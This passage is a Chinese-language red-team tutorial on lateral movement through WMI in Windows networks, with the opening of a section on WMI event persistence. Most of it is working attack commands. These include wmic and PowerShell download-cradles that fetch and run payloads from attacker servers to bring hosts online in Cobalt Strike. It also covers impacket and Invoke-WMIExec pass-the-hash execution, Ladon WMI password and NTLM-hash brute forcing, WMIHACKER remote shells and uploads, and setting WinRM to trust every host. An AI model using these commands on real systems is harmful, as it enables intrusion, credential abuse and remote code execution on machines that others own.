> **wmic调用cmd** ***注意** ：以下命令需要管理员权限。*
    ###向指定IP执行cmd命令
    wmic /node:10.10.0.10 /user:administrator /password:win@123 process call create "cmd.exe /c ipconfig >c:\ip.txt"
**wmic上线CS**
> ***注意** ：请注意powershell对于特殊字符的转义，例如“，@，#，$等等。*
  * Scripted Web Delivery
    wmic /NODE:192.168.8.180 /user:"administrator" /password:"win@123" PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx:8881/a'))\""
选择攻击模块
设置C2的Host以及监听器
在客户机上执行wmic命令，让指定的主机上线CS
  * payload generator
> ***注意** ：测试下载时，可以自行使用Python开启WEB共享服务。*
    wmic /NODE:192.168.8.179 /user:"administrator" /password:"Aatest" PROCESS call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.191:8000/payload.ps1');\""
选择攻击模块
设置监听器，并选择Powershell作为载荷
在客户机上执行wmic命令，让指定机器上线CS
**impacket-wmiexec.py**
> ***注意** ：请按照实际情况选择wmiexec.py的参数。*
    "注意：根据impacket的版本不同，依赖的python版本也不同，这里笔者使用最新版本impacket，依赖python3。"
    "注意：遇到特殊字符使用\进行转移，例如123@456，转义后：123\@456"
    python3 wmiexec.py  用户名:密码@目标IP
    python3 wmiexec.py  域名/用户名:密码@目标IP    #哈希传递获得shell
    python3 wmiexec.py  域名/用户名:密码@目标IP    "ipconfig"   #执行命令
    python3 wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP    #哈希传递获得shell
    python3 wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP "ipconfig"   #执行命令
使用账号密码远程工作组机器
使用账号密码远程域机器
使用hash远程工作组机器
使用hash远程域机器
> ***注意** ：wmiexec 使⽤445端⼝传回显。*
**impacket-wmiexe.exe**
    wmiexec.exe test1.com/win16:PI:EMAIL -dc-ip 10.10.0.10
使用账号密码远程域机器
**Ladon**
模块功能 | 目标端口 | 目标系统 | 使用教程  
---|---|---|---  
WMI爆破 | 135 | Windows | [教程](http://k8gege.org/Ladon/WmiScan.html)  
WMI-NtlmHash爆破 | 135 | Windows | [教程](http://k8gege.org/Ladon/WmiScan.html)  
WmiExec | 135 | Windows | 只需要135端口通过注册表回显，不依赖445、Powershell  
WmiExec2 | 135 | Windows | 只需135端口通过注册表回显，但依赖Powershell  
**WMI爆破(135端口)**
> ***注意** ：请提前在ladon.exe目录下准备好user.txt和pass.txt。*
    ladon.exe 192.168.8.192/24 WmiScan
**WMI-NtlmHash爆破（135端口）**
    ladon.exe  192.168.8.192 WmiHashScan
**WmiExec**
    ladon.exe wmiexec 192.168.8.192 Administrator win@123 cmd whoami
Ladon wmiexec成功执行命令
**WmiExec2**
    ###在工作组尝试执行命令
    ladon.exe wmiexec2 192.168.8.192 Administrator win@123 cmd whoami
    ###在域内尝试执行命令
    ladon.exe wmiexec2 10.10.0.10 test1\Administrator win@123 cmd whoami
Ladon wmiexec2成功在工作组执行命令
Ladon wmiexec2成功在域内执行命令
**WMIcmd**
> ***注意** ：WMIcmd需要.NET4.5.2的支持。*
    WMIcmd.exe -h IP -d hostname -u localadmin -p theirpassword -c "command"
WMIcmd.exe在工作组上使用
    WMIcmd.exe -h IP -d domain -u domainadmin -p theirpassword -c "command"
WMIcmd.exe在域内使用
**pth-wmic**
> ***注意** ：此为kali内置工具，只能执行一些WMI命令，无法执行其他命令*
    ###查询指定主机的用户列表select Name from Win32_UserAccount###
    pth-wmic -U pig/Administrator%00000000000000000000000000000000:c56ade0c054ba703d9f56e302224bbb3 //192.168.8.181 "select Name from Win32_UserAccount"
使用pth-wmic来远程管理指定主机的WMI
**WMIHACKER**
> ***注意** ：wmihacker.vbs是在wmiexec.vbs基础上进行改进并优化的,新增了上传下载功能，其所需管理员权限。*
    ###命令执行后显示结果
    cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1
    ###命令执行后不显示任何结果
    cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0
    ###获取交互式shell
    cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!"
    ###文件上传：将本地calc.exe复制到远程主机c:\calc.exe
    cscript wmihacker_0.6.vbs /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"
    ###文件下载：将远程主机calc.exe下载到本地c:\calc.exe
    cscript wmihacker_0.6.vbs /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe"
    #获取半交互式shell
    cscript.exe wmihacker.vbs /shell 192.168.8.179 Administrator "win@123"
工作组内获取半交互式shell
    #获取半交互式shell
    cscript.exe wmihacker.vbs /shell 10.10.0.10 win16 "win16"
域内获取半交互式shell
    #将本地calc.exe复制到远程主机c:\calc.exe
    cscript wmihacker_0.6.vbs /upload 192.168.8.179 administrator "win@123" "c:\windows\system32\calc.exe" "c:\calc"
工作组内进行文件上传
上传成功
**Invoke-WMIMethod**
> ***注意**
> ：该模块为Powershell内置模块，以下为示例，可以自由组合命令进行测试。示例在Windows2008R2、Windows2012R2、Windows2016均测试成功。*
    $User            #目标系统用户名
    $Password        #目标系统密码
    $Cred            #账号密码整合，导入Credential
    Invoke-WMIMethod #远程运行指定程序
    #####---------------------------#####
    $User = "WIN-D5IP32RU4A9\administrator"
    $Password= ConvertTo-SecureString -String "win@123" -AsPlainText -Force
    $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password
    Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.8.179" -Credential $Cred
执行Powershell命令，成功创建运行cmd.exe，进程号为3192
3192进程对应的cmd.exe
**Invoke-WmiCommand**
> ***注意** ：Invoke-> WmiCommand.ps1为PowerSploit内置利用脚本，以下示例在Windows2008R2、Windows2012R2、Windows2016均测试成功。*
    IEX....               #下载脚本并导入系统
    $User                 #目标系统用户名
    $Password             #目标系统密码
    $Cred                 #账号密码整合，导入Credential
    $Remote               #远程运行指定命令或程序
    $Remote.PayloadOutput #将执行结果输出到屏幕上
    #####---------------------------#####
    IEX(New-Object Net.Webclient).DownloadString('http://192.168.8.190:8000/Invoke-WmiCommand.ps1')
    $User = "WIN-D5IP32RU4A9\administrator"
    $Password = ConvertTo-SecureString -String "win@123" -AsPlainText -Force
    $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
    $Remote = Invoke-WmiCommand -Payload {whoami} -Credential $Cred -ComputerName 192.168.8.179
    $Remote.PayloadOutput
执行成功，whoami的命令得到回显
**Invoke-WMIExec.ps1**
    Invoke-WMIExec -Target 192.168.0.110  -Username Administrator -Hash 3edc68a5debd735545ddf69fb3c224a8 -Command "cmd /c ipconfig >>c:\ipconfig.txt" -Verbose
在工作组中内执行该PS1脚本
    Invoke-WMIExec -Target 10.10.0.10 -Domain test1.com -Username Administrator -Hash 3edc68a5debd735545ddf69fb3c224a8 -Command "cmd /c ipconfig >>c:\ipconfig.txt" -VerboseSharp-WMIExec
在域内执行该PS1脚本
**WmiSploit**
  * Enter-WmiShell（建立交互式shell）
    Enter-WmiShell -ComputerName WIN-D5IP32RU4A9 -UserName Administrator
输入指定帐户凭据
利用Enter-WmiShell模块获取工作组交互式shell
利用Enter-WmiShell模块获取域内交互式shell
  * Invoke-WmiCommand(执行命令)
    Invoke-WmiCommand -ComputerName WIN-D5IP32RU4A9 -ScriptBlock {tasklist}
**WMImplant**
> ***注意** ：WMimplant 的功能一旦执行就可以在主菜单中找到。它可以执行文件传输操作、横向移动和主机侦察。
> CHANGE_USER命令做存储凭据使用。它有一个 shell 功能，可以使用 command_exec 触发，文件操作也可以远程执行。*
使用CHANGE_USER后执行命令
使用shell执行命令
文件操作
**WinRM**
> ***注意** ：Windows默认WinRM需要设置信任来源地址，在测试前，请设置信任所有来源地址，也就是允许被任意主机连接。*
    winrm set winrm/config/client @{TrustedHosts="*"}
允许被任意主机连接
    winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"}
在本地弹出计算器
    winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"} -r:
    https://192.168.8.192:5985
     -u:administrator -p:win@123
远程静默启动进程
###  部分意见
笔者上述罗列的部分工具原理都是一样，在实现的方法上各有千秋，建议各位同学根据实际场景需要针对性的DIY来满足自己的需求，解决问题，笔者建议ladon的爆破工具，wmic信息收集、以及WinRM需要留意。希望在实际攻防中，根据自身经验优先选择现有工具进行操作，如若没有趁手的，则可以自己使用.net或者VBS来进行开发。
**本文参考文章**
  * [内网横移之WinRM](https://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/)
  * [内网渗透|基于WMI的横向移动](https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/)
  * [WmiScan 135端口智能密码/WMI密码爆破](http://k8gege.org/Ladon/WmiScan.html)
  * [WinRM的横向移动详解](https://www.freebuf.com/articles/system/259632.html)
  * [WMI横向移动](https://blog.csdn.net/lhh134/article/details/104150949)
  * [不需要 Win32_Process – 扩展 WMI 横向运动](https://www.cybereason.com/blog/wmi-lateral-movement-win32)
## WMI利用（权限维持）
###  讲在前面：
在简单了解了WMI后，我们开始了横向移动，包括其中的信息收集，工具利用。那么在我们短暂的获取权限后，如何才能将权限持久化，也就是所说的权限维持住呢？笔者看了国内外部分文章后，发现WMI做权限维持主要是介绍WMI事件，并将其分为永久事件和临时事件，本文参考部分博客文章对WMI事件进行讲解，不足之处，望及时指出。
###  什么是WMI事件
WMI事件，即特定对象的属性发生改变时发出的通知，其中包括增加、修改、删除三种类型。可以使用wmic来进行操作。通俗的可以说：WMI内部出现什么变化就由WMI事件来进行通知。  
WMI事件中的事件消费者可以分为临时和永久两类，临时的事件消费者只在其运行期间关心特定事件并进行处理，永久消费者作为类的实例注册在WMI命名空间中，一直有效到它被注销。所以在权限维持中一般我们使用WMI永久事件来进行。  
对于WMI事件的官方解释以及部分博客解释：
  * [WMI事件通知](https://cloud.tencent.com/developer/article/1383673)
  * [接收WMI事件](https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event)
**查询事件**
    #列出事件过滤器
    Get-WMIObject -Namespace root\Subscription -Class __EventFilter
    #列出事件消费者
    Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
    #列出事件绑定
    Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
列出事件过滤器
列出事件消费者
**删除事件**
    #删除事件过滤器
    Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='事件过滤器名'" | Remove-WmiObject -Verbose
    #删除事件消费者